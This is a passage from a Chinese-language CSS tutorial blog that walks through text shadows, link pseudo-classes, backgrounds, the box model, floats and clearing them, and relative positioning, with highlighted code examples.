class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>「享延保、碎屏保8折优惠；赠小米移动流量卡；赠多看阅读VIP季卡；享特惠加价购」<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>一亿像素夜景相机 / 国内首发骁龙 750G处理器 / 6.67&#x27;&#x27;小孔径全面屏 / 120Hz六档变速高刷屏 / 全场景AI四摄 / 线性马达 / 4820mAh+33W闪充 / 立体声双扬声器 / 多功能NFC<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;p3&quot;</span>&gt;</span>Xiaomi, a global company producing quality products at honest pricing.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="3-4-阴影"><a href="#3-4-阴影" class="headerlink" title="3.4 阴影"></a>3.4 阴影</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*text-shadow:阴影颜色，水平偏移，垂直偏移，阴影半径*/</span></span><br><span class="line"><span class="selector-id">#university</span>&#123;</span><br><span class="line"><span class="attribute">text-shadow</span>: deepskyblue <span class="number">10px</span> -<span class="number">10px</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-5-超链接伪类"><a href="#3-5-超链接伪类" class="headerlink" title="3.5 超链接伪类"></a>3.5 超链接伪类</h3><p>正常情况下：a,  a:hover</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*鼠标悬浮的状态*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: orange;</span><br><span class="line">	<span class="attribute">font-size</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*鼠标按住未释放的状态*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: brown;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*访问过的状态*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span><br><span class="line">	<span class="attribute">color</span>: burlywood;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-6-列表"><a href="#3-6-列表" class="headerlink" title="3.6 列表"></a>3.6 列表</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*ul li*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">list-style:</span></span><br><span class="line"><span class="comment">    none  去掉圆点</span></span><br><span class="line"><span class="comment">    circle  空心圆</span></span><br><span class="line"><span class="comment">    decimal 数字</span></span><br><span class="line"><span class="comment">    square  正方形</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*ul&#123;*/</span></span><br><span class="line"><span class="comment">/*    background: darkgrey;*/</span></span><br><span class="line"><span class="comment">/*&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-7-背景"><a href="#3-7-背景" class="headerlink" title="3.7 背景"></a>3.7 背景</h3><p>背景颜色</p>
<p>背景图片</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    div&#123;</span><br><span class="line">        width: 1000px;</span><br><span class="line">        height: 700px;</span><br><span class="line">        border: 1px solid red;</span><br><span class="line"><span class="css">        <span class="selector-tag">background-image</span>: <span class="selector-tag">url</span>(&quot;<span class="selector-tag">IMG_5966</span><span class="selector-class">.jpg</span>&quot;);</span></span><br><span class="line"><span class="css">        <span class="comment">/*默认是全部平铺的*/</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">        background-repeat: repeat-x;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.div2</span>&#123;</span></span><br><span class="line">        background-repeat: repeat-y;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.div3</span>&#123;</span></span><br><span class="line">        background-repeat: no-repeat;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">1em</span>;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;img_1.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">245px</span> <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205180851963.png" alt="image-20210205180851963"></p>
<h3 id="3-8-渐变"><a href="#3-8-渐变" class="headerlink" title="3.8 渐变"></a>3.8 渐变</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-color</span>: <span class="selector-id">#0093E9</span>;</span><br><span class="line"><span class="selector-tag">background-image</span>: <span class="selector-tag">linear-gradient</span>(45<span class="selector-tag">deg</span>, <span class="selector-id">#0093E9</span> 0%, <span class="selector-id">#80D0C7</span> 100%);</span><br></pre></td></tr></table></figure>


<h2 id="4、盒子模型"><a href="#4、盒子模型" class="headerlink" title="4、盒子模型"></a>4、盒子模型</h2><h3 id="4-1-什么是盒子"><a href="#4-1-什么是盒子" class="headerlink" title="4.1 什么是盒子"></a>4.1 什么是盒子</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205200452777.png" alt="image-20210205200452777"></p>
<p>margin：外边距</p>
<p>padding：内边距</p>
<p>border：边框</p>
<h3 id="4-2-边框"><a href="#4-2-边框" class="headerlink" title="4.2 边框"></a>4.2 边框</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="selector-tag">h2</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">li</span>,<span class="selector-tag">a</span>,<span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="comment">/*body总有一个默认的外边距margin:0 常见操作*/</span></span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">border:粗细，样式，颜色</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-id">#box</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h2</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#b5deb0</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">color</span>: darkslateblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">form</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: lightsteelblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(1)</span>&gt;<span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(2)</span>&gt;<span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> dashed powderblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(3)</span>&gt;<span class="selector-tag">input</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> dashed darkslateblue;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/<span class="selector-tag">style</span>&gt;</span><br></pre></td></tr></table></figure>


<h3 id="4-3-内外边距"><a href="#4-3-内外边距" class="headerlink" title="4.3 内外边距"></a>4.3 内外边距</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        h2,h1,ul,li,a,body&#123;</span><br><span class="line"><span class="css">            <span class="comment">/*body总有一个默认的外边距margin:0 常见操作*/</span></span></span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line">        border:粗细，样式，颜色</span><br><span class="line">        */</span><br><span class="line"><span class="css">        <span class="selector-id">#box</span>&#123;</span></span><br><span class="line">            width: 300px;</span><br><span class="line">            border: 1px solid red;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">        ;</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line">        顺时针旋转</span><br><span class="line">        margin: 0</span><br><span class="line">        margin: 0 1px</span><br><span class="line">        margin: 0 1px 2px 3px</span><br><span class="line">        */</span><br><span class="line">        h2&#123;</span><br><span class="line">            font-size: 16px;</span><br><span class="line"><span class="css">            <span class="selector-tag">background</span>: <span class="selector-id">#b5deb0</span>;</span></span><br><span class="line">            line-height: 30px;</span><br><span class="line">            color: darkslateblue;</span><br><span class="line">            margin: 0 1px 2px 3px;</span><br><span class="line">        &#125;</span><br><span class="line">        form&#123;</span><br><span class="line">            background: lightsteelblue;</span><br><span class="line">        &#125;</span><br><span class="line">        input&#123;</span><br><span class="line">            border: 1px solid black;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(1)</span>&#123;</span></span><br><span class="line">            padding: 10px 2px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>会员登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>邮箱：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>盒子的计算方式：你这个元素到底多大？</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205203059431.png" alt="image-20210205203059431"></p>
<p>margin+border+padding+内容宽度</p>
<h3 id="4-4-圆角边框"><a href="#4-4-圆角边框" class="headerlink" title="4.4 圆角边框"></a>4.4 圆角边框</h3><p>4个角</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">    <span class="comment">&lt;!--顺时针方向--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">圆圈：100px</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        div&#123;</span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 100px;</span><br><span class="line">            border: 10px solid red;</span><br><span class="line">            border-radius: 50px  20px 10px 5px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="4-5-盒子阴影"><a href="#4-5-盒子阴影" class="headerlink" title="4.5 盒子阴影"></a>4.5 盒子阴影</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--margin: 0 auto;  居中</span></span><br><span class="line"><span class="comment">    要求：块元素，块元素有固定的宽度</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        div&#123;</span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 100px;</span><br><span class="line">            border: 10px solid red;</span><br><span class="line">            box-shadow: 10px 10px 10px yellow;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="5、浮动"><a href="#5、浮动" class="headerlink" title="5、浮动"></a>5、浮动</h2><h3 id="5-1-标准文档流"><a href="#5-1-标准文档流" class="headerlink" title="5.1 标准文档流"></a>5.1 标准文档流</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205214720292.png" alt="image-20210205214720292"></p>
<p>块级元素：独占一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h1~h6	p	div		列表</span><br></pre></td></tr></table></figure>
<p>行内元素：不独占一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">span	a	img		strong...</span><br></pre></td></tr></table></figure>
<p>行内元素可以被包围在块级元素中，反之，则不可以</p>
<h3 id="5-2-display"><a href="#5-2-display" class="headerlink" title="5.2 display"></a>5.2 display</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">block：块元素</span></span><br><span class="line"><span class="comment">inline：行内元素</span></span><br><span class="line"><span class="comment">inline-block：是块元素，但是可以内联，在一行</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    div&#123;</span><br><span class="line">        width: 100px;</span><br><span class="line">        height: 100px;</span><br><span class="line">        border: 2px solid red;</span><br><span class="line">        display: inline;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    span&#123;</span><br><span class="line">        width: 100px;</span><br><span class="line">        height: 100px;</span><br><span class="line">        border: 1px solid red;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个也是一种实现行内元素排列的方式，但是我们很多情况都是用float</p>
</blockquote>
<h3 id="5-3-float"><a href="#5-3-float" class="headerlink" title="5.3 float"></a>5.3 float</h3><ol>
<li>左右浮动 float</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.layer</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solide <span class="number">#060</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="5-4-父级边框塌陷的问题"><a href="#5-4-父级边框塌陷的问题" class="headerlink" title="5.4 父级边框塌陷的问题"></a>5.4 父级边框塌陷的问题</h3><p>clear</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">clear: right;  右侧不允许有浮动元素</span></span><br><span class="line"><span class="comment">clear: left;  左侧不允许有浮动元素</span></span><br><span class="line"><span class="comment">clear: both;  两侧不允许有浮动元素</span></span><br><span class="line"><span class="comment">clear: none; </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p><strong>解决方案：</strong></p>
<ol>
<li>增加父级元素的高度</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#father</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#000</span> solid;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">800px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>增加一个空的div标签清除浮动</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clear&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.clear&#123;</span><br><span class="line">    clear: both;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>overflow</li>
</ol>
<p>在父级元素中增加一个<code>overflow： hidden;</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#father</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#000</span> solid;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>父类添加一个伪类：after</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#father</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">	<span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ol>
<li><p>浮动元素后面增加空div</p>
<p>简单，代码中尽量避免空div</p>
</li>
<li><p>设置父元素的高度</p>
<p>简单，元素假设有了固定的高度，就会被限制</p>
</li>
<li><p>overflow</p>
<p>简单，下拉的一些场景避免使用</p>
</li>
<li><p>父类添加一个伪类：after（推荐）</p>
<p>写法稍微复杂一点，但是没有副作用，推荐使用</p>
</li>
</ol>
<h3 id="5-5-对比"><a href="#5-5-对比" class="headerlink" title="5.5 对比"></a>5.5 对比</h3><ul>
<li><p>display</p>
<p>方向不可控制</p>
</li>
<li><p>float</p>
<p>浮动起来的话会脱离标准文档流，所以要解决父级边框塌陷的问题</p>
</li>
</ul>
<h2 id="6、定位"><a href="#6、定位" class="headerlink" title="6、定位"></a>6、定位</h2><h3 id="6-1-相对定位"><a href="#6-1-相对定位" class="headerlink" title="6.1 相对定位"></a>6.1 相对定位</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    相对定位</span></span><br><span class="line"><span class="comment">    相对于自己原来的位置进行偏移</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line">            padding: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        div&#123;</span><br><span class="line">            margin: 10px;</span><br><span class="line">            padding: 5px;</span><br><span class="line">            font-size: 12px;</span><br><span class="line">            line-height: 25px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#father</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#666</span>;</span></span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#first</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#299e4e</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#299e99</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span>: <span class="selector-tag">relative</span>; <span class="comment">/*相对定位：上下左右*/</span></span></span><br><span class="line">            top: -20px;</span><br><span class="line">            left: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#second</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#98ac27</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#98ac99</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#third</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#722da3</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#722d99</span>;</span></span><br><span class="line">            position: relative;</span><br><span class="line">            bottom: -10px;</span><br><span class="line">            right: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;first&quot;</span>&gt;</span>第一个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;second&quot;</span>&gt;</span>第二个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;third&quot;</span>&gt;</span>第三个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>相对定位：<code>position: relative;</code></p>
<p>相对于原来的位置，进行指定的偏移，相对定位的话，它仍然在标准文档流中，原来的位置会被保留</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">top</span>: <span class="selector-tag">-20px</span>;</span><br><span class="line"><span class="selector-tag">left</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">bottom</span>: <span class="selector-tag">-10px</span>;</span><br><span class="line"><span class="selector-tag">right</span>: 20<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure>
<p>练习：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        div&#123;</span><br><span class="line">            border: 2px solid red;</span><br><span class="line">            width: 300px;</span><br><span class="line">            height: 300px;</span><br><span class="line">            padding: 5px;</span><br><span class="line">        &#125;</span><br><span class="line">        a &#123;</span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 100px;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            background-color: pink;</span><br><span class="line">            color: white;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            text-align: center;</span><br><span class="line">            line-height: 100px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line">            background-color: deepskyblue;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#href1</span>&#123;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#href2</span>&#123;</span></span><br><span class="line">            position: relative;</span><br><span class="line">            left: 95px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#href3</span>&#123;</span></span><br><span class="line">            position: relative;</span><br><span class="line">            top: 100px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#href4</span>&#123;</span></span><br><span class="line">            position: relative;</span><br><span class="line">            top: 100px;</span><br><span class="line">            left: 95px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#href5</span>&#123;</span></span><br><span class="line">            position: relative;</span><br><span class="line">            top: -100px;</span><br><span class="line">            left: 100px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;href1&quot;</span>&gt;</span>链接1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;href2&quot;</span>&gt;</span>链接2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;href3&quot;</span>&gt;</span>链接3<span 